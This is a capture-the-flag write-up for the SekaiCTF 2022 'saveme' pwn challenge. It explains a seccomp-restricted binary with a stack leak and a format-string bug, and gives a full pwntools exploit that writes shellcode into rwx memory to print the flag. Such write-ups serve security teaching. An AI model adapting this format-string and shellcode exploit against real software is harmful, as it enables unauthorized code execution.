---
title: "[Pwn] saveme [SekaiCTF 2022]"
date: 2022-10-03 23:48:00
---

# 0x0 Introduction

I got lost in my memory. Please save me!

Author: Jonathan

nc challs.ctf.sekai.team 4001

files: [saveme.zip](saveme.zip)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fc000)
```

# 0x2 My approach

First of all lets analysis the program. 

the first thing that caught my eye is that the program uses `seccomp` to add restriction to certain system calls. We can easily check the the seccomp rules by using a tool called `seccomp-tools`.

![2022-10-03_235754.png](/ctf-writeup/2022/sekaictf/pwn/saveme/2022-10-03_235754.png)

```
23:55:55 $ seccomp-tools dump ./saveme 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

The seccomp here check both `ARCH_X86_64` and `A < 0x40000000`, which means we are not able to use x32 ABI or use `retf` to bypass this restriction.

As we can see here, seccomp only allow us to use `read`, `write`, and `exit_group`. There is no way we can get a shell from this. 

But luckily, the program already have the flag store in the memory and allocate a `rwx` memory space. if we are able to get the address of flag and have an arbitray code execution, we can print out the flag using `write`.
```
0040129f      mmap(0x405000, 0x1000, 7, 0x22, 0, 0);
...
0040137f      int64_t rax_2 = malloc(0x50);
00401399      int32_t rax_4 = open("flag.txt", 0);
```

now come to the main vulnerabilities. 

1. the program leak the stack address
2. we have a printf that printf whatever user have input.

these two vulnerabilities give us an arbitrary write on the whole memory space. Since the program also leak the stack address, we can also overwrite rip to control the return pointer.
```
00401424      void var_68;
...
00401476      printf("| Here is your gift: %p         …", &var_68);
...
004014d6      else if (rax_6 == 2)
004014d2      {
004014f4          printf("Please leave note for the next p…");
0040150c          __isoc99_scanf("%80s", &var_68);
0040151d          printf(&var_68);
00401531          putc(0xa, stdout);
00401529      }
```

looks like we got everything we want. just write shellcode to the executable memory space and return to that.

the idea is correct, but the program have a 80 input length limit, which means we are not able to write the whole shellcode in a single printf. To do that, we need some how make a loop.  so that we can use the `printf` vulnerability multiple time and write all the shellcode.

my first approach here is write rip to main function. but it didn't work here. not only because of the stack pointer part, but also the seccomp part. Since the program setup seccomp filter when program execuate main function at first time. Program are not able to use `open` syscall again. The syscall to `open` violate the seccomp filter and kill the program immediately.

So, how can we bypass this. the solution is straight forward - **overwrite the return pointer of printf**. Since we have the stack address, we can overwrite the return pointer of printf and let it return to the vulnerability again. In this way, we could write any number of data into the memory space.

finally, when we finish writing shellcode into the memory, we overwrite the return pointer to shellcode itself and get the flag.

*there is one more thing that need to be considered: since scanf stop scan at `\0xa` (\n). we need to choose an address that could avoid all `\0xa` in the final printf payload.*


# 0x3 Exploit

```python
from pwn import *

exe = ELF("saveme")
exe_rop = ROP(exe)

context.binary = exe

def wait():
    if args.LOCAL and args.R2:
        input("wait")
    else:
        time.sleep(0.2)

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("challs.ctf.sekai.team", 4001)
    return r

ret_addr = exe_rop.find_gadget(['ret'])[0]

main_addr = 0x004013f4
sc_start_addr = 0x405030 # use this to avoid 0xa

do_read_shellcode = ''.join([
    shellcraft.mov("rsi",0x405000),
    shellcraft.read(0, 'rsi', 0x200),
])

do_read_shellcode = '\n'.join([
    "mov rsi,0x405030",
    "xor rax,rax",
    "xor rdi,rdi",
    "mov rdx,0x200",
    "syscall"
])

sc0 = asm(do_read_shellcode)
lp("first shellcode",hex(len(sc0)),do_read_shellcode)

io = start()
io.recvuntil(b"gift: ")
stack_leak = int(io.recvuntil(b' ',drop=True),16)
lp('stack leak',hex(stack_leak))

print_flag_shellcode = "\n".join([
    "mov rdi,0x10",
    f"mov rax,{hex(exe.plt['malloc'])}",
    f"call rax",
    "mov rsi,rax",
    "mov rdi,0x1410",
    "sub rsi,rdi",
    "xor rdi,rdi",
    "mov rdi,1",
    "mov rdx,0x50",
    "mov rax,1",
    "syscall",
])

lp("print flag shellcode\n",print_flag_shellcode)
sc1 = asm(print_flag_shellcode)


io.sendlineafter(b"Your option: ",b'2')
    
payload = fmtstr.fmtstr_payload(8,{
        stack_leak-0x18:0x004014e8,
},write_size='short')
lp(len(payload),payload)
io.sendlineafter(b'next person: ',payload)

lp("iteration",len(sc0)//2)
for i in range(len(sc0)//2):
    print(i)
    payload = fmtstr.fmtstr_payload(8,{
        sc_start_addr+i*2:sc0[i*2:i*2+2],
        stack_leak-0x18:0x004014e8,
    },write_size='short')

    payload = payload + b'\x00'*(80-len(payload)-1)
    io.sendlineafter(b'next person: ',payload)
    lp("payload",len(payload),payload)

payload = fmtstr.fmtstr_payload(8,{
    stack_leak-0x18:sc_start_addr,
},write_size='short')
lp(f"ret2shellcode payload {len(payload)} {payload}")
io.sendlineafter(b'next person: ',payload)
wait()
io.send(sc0+sc1)
io.interactive()

```

# 0x4 Flag

SEKAI{Y0u_g0T_m3_n@w_93e127fc6e3ab73712408a5090fc9a12}